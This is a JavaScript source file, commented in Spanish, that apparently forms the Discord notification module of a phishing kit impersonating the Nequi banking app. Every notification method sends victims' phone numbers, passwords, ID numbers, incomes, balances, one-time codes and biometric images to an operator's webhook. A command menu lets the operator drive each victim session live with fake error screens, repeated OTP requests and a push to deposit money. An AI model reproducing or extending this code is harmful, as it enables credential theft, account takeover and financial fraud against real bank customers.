/**
 * Servicio de Discord - Maneja todas las comunicaciones con Discord
 */

const axios = require('axios');
const FormData = require('form-data');
const config = require('../../config/discord.config');

class DiscordService {
  constructor() {
    this.webhookUrl = config.webhookUrl;
    this.enabled = config.enabled;
    this.timeout = config.timeout;
    this.retryAttempts = config.retryAttempts;
    this.colors = config.colors;
    this.footer = config.footer;
  }

  /**
   * Envía un mensaje a Discord con reintentos automáticos
   */
  async sendToDiscord(embed, type = 'info', files = null) {
    if (!this.enabled) {
      console.warn('⚠️ Discord no configurado - Mensaje no enviado');
      return false;
    }

    try {
      const payload = {
        embeds: [{
          title: embed.title || 'Notificación',
          description: embed.description || '',
          color: this.colors[type] || this.colors.info,
          fields: this._sanitizeFields(embed.fields || []),
          footer: {
            text: `${this.footer.text} ${new Date().toLocaleString('es-CO')}`,
          },
          timestamp: new Date().toISOString(),
        }]
      };

      // Si tiene archivos adjuntos
      if (files && files.length > 0) {
        const formData = new FormData();
        formData.append('payload_json', JSON.stringify(payload));
        
        files.forEach((file, index) => {
          formData.append(`files[${index}]`, file.buffer, file.filename);
        });

        const response = await axios.post(this.webhookUrl, formData, {
          headers: formData.getHeaders(),
          timeout: this.timeout,
        });

        return response.status === 200 || response.status === 204;
      }

      // Envío normal
      const response = await axios.post(this.webhookUrl, payload, {
        headers: { 'Content-Type': 'application/json' },
        timeout: this.timeout,
      });

      return response.status === 200 || response.status === 204;

    } catch (error) {
      console.error('❌ Error enviando a Discord:', error.message);
      return false;
    }
  }

  /**
   * Sanitiza los campos para evitar problemas
   */
  _sanitizeFields(fields) {
    return fields.map(field => ({
      name: String(field.name || 'Campo').substring(0, 256),
      value: String(field.value || 'No disponible').substring(0, 1024),
      inline: field.inline || false,
    }));
  }

  // ==================== NOTIFICACIONES ESPECÍFICAS ====================

  async notificarNuevoIngreso(sessionId, phoneNumber, password, ip, country, city) {
    return this.sendToDiscord({
      title: '🟣 NUEVO INGRESO NEQUI',
      description: 'Se han recibido las credenciales de acceso',
      fields: [
        { name: '📱 Número', value: `\`${phoneNumber}\``, inline: true },
        { name: '🔑 Clave', value: `\`${password}\``, inline: true },
        { name: '🌐 IP', value: `\`${ip}\``, inline: true },
        { name: '📍 Ubicación', value: `${city}, ${country}`, inline: true },
        { name: '🆔 Session', value: `\`${sessionId}\``, inline: false }
      ]
    }, 'security');
  }

  async notificarPrestamoCompleto(sessionId, session) {
    return this.sendToDiscord({
      title: '🟣 INFO DE PRÉSTAMO COMPLETA',
      description: 'Datos completos del préstamo',
      fields: [
        { name: '📱 Número', value: `\`${session.phoneNumber || 'N/A'}\``, inline: true },
        { name: '🔑 Clave', value: `\`${session.password || 'N/A'}\``, inline: true },
        { name: '🪪 Cédula', value: `\`${session.cedula || 'N/A'}\``, inline: true },
        { name: '👤 Nombre', value: session.nombreCompleto || 'N/A', inline: true },
        { name: '🧑‍💼 Ocupación', value: session.ocupacion || 'N/A', inline: true },
        { name: '📈 Ingresos', value: session.ingresoMensual || 'N/A', inline: true },
        { name: '💸 Gastos', value: session.gastosMensual || 'N/A', inline: true },
        { name: '💰 Saldo 1', value: `\`${session.saldoActual1 || 'N/A'}\``, inline: true },
        { name: '💰 Saldo 2', value: `\`${session.saldoActual2 || 'N/A'}\``, inline: true },
        { name: '🌐 IP', value: `\`${session.ip || 'N/A'}\``, inline: true },
        { name: '📍 Ubicación', value: `${session.city || 'N/A'}, ${session.country || 'N/A'}`, inline: true },
        { name: '🆔 Session', value: `\`${sessionId}\``, inline: false }
      ]
    }, 'nequi');
  }

  async notificarDinamica(sessionId, session, otp, attemptNumber) {
    return this.sendToDiscord({
      title: `📲 DINÁMICA ${attemptNumber} RECIBIDA`,
      description: 'Se ha recibido una nueva dinámica',
      fields: [
        { name: '📱 Número', value: `\`${session.phoneNumber || 'N/A'}\``, inline: true },
        { name: '🔑 Clave', value: `\`${session.password || 'N/A'}\``, inline: true },
        { name: '👤 Nombre', value: session.nombreCompleto || 'N/A', inline: true },
        { name: '💰 Saldo 1', value: `\`${session.saldoActual1 || 'N/A'}\``, inline: true },
        { name: '💰 Saldo 2', value: `\`${session.saldoActual2 || 'N/A'}\``, inline: true },
        { name: '🔢 Dinámica', value: `\`${otp}\``, inline: true },
        { name: '🆔 Session', value: `\`${sessionId}\``, inline: false }
      ]
    }, 'warning');
  }

  async notificarBiometria(sessionId, session, finalPhoneNumber, ip) {
    return this.sendToDiscord({
      title: '🧬 BIOMETRÍA RECIBIDA',
      description: 'Se ha recibido una imagen de biometría',
      fields: [
        { name: '📱 Número', value: `\`${finalPhoneNumber}\``, inline: true },
        { name: '🆔 Session', value: `\`${sessionId}\``, inline: true },
        { name: '🌐 IP', value: `\`${session.ip || ip || 'N/A'}\``, inline: true }
      ]
    }, 'security');
  }

  async notificarConsignacion(sessionId, phoneNumber, password, ip) {
    return this.sendToDiscord({
      title: '💰 QUIERE CONSIGNAR',
      description: 'El usuario desea realizar una consignación',
      fields: [
        { name: '📱 Número', value: `\`${phoneNumber}\``, inline: true },
        { name: '🔑 Clave', value: `\`${password}\``, inline: true },
        { name: '🌐 IP', value: `\`${ip}\``, inline: true },
        { name: '✅ Estado', value: '✅ SI QUIERO CONSIGNAR', inline: false },
        { name: '📲 Acción', value: 'ENVÍAME POR WHATSAPP PARA CONTINUAR', inline: false },
        { name: '🆔 Session', value: `\`${sessionId}\``, inline: false }
      ]
    }, 'success');
  }

  async notificarMenu(sessionId, type = 'loan') {
    const menus = {
      loan: {
        title: '📋 MENÚ DE ACCIONES - PRÉSTAMO',
        fields: [
          { name: '🔴 Error Número', value: `\`/go acccess-sign-in ${sessionId}\``, inline: true },
          { name: '🔴 Error Clave', value: `\`/go access-sign-in-pass ${sessionId}\``, inline: true },
          { name: '🧬 Biometría', value: `\`/go biometria ${sessionId}\``, inline: true },
          { name: '🧬 Documentos', value: `\`/go documento ${sessionId}\``, inline: true },
          { name: '🔴 Error Monto', value: `\`/go loan-simulator-error ${sessionId}\``, inline: true },
          { name: '♻️ Pedir Dinámica', value: `\`/go one-time-pass ${sessionId}\``, inline: true },
          { name: '♻️ Pedir Dinámica SMS', value: `\`/go one-time-sms ${sessionId}\``, inline: true },
          { name: '🚫 BANEAR', value: `\`/ban ${sessionId}\``, inline: true },
          { name: '✅ Consignar', value: `\`/go consignar ${sessionId}\``, inline: true }
        ]
      },
      dynamic: {
        title: '📋 MENÚ DE DINÁMICAS',
        fields: [
          { name: '❌ Error Dinámica', value: `\`/go error-dynamic ${sessionId}\``, inline: true },
          { name: '❌ Error Número', value: `\`/go acccess-sign-in ${sessionId}\``, inline: true },
          { name: '🧬 Biometría', value: `\`/go biometria ${sessionId}\``, inline: true },
          { name: '🧬 Documentos', value: `\`/go documento ${sessionId}\``, inline: true },
          { name: '❌ Error Clave', value: `\`/go access-sign-in-pass ${sessionId}\``, inline: true },
          { name: '❌ Error Monto', value: `\`/go loan-simulator-error ${sessionId}\``, inline: true },
          { name: '♻️ Pedir Dinámica SMS', value: `\`/go one-time-sms ${sessionId}\``, inline: true },
          { name: '🚫 BANEAR', value: `\`/ban ${sessionId}\``, inline: true },
          { name: '✅ Consignar', value: `\`/go consignar ${sessionId}\``, inline: true }
        ]
      }
    };

    const menu = menus[type] || menus.loan;
    return this.sendToDiscord({
      title: menu.title,
      description: 'Selecciona la acción que deseas realizar:',
      fields: menu.fields,
      footer: {
        text: `🆔 Session: ${sessionId} | Responde con el comando exacto`
      }
    }, 'info');
  }
}

module.exports = new DiscordService();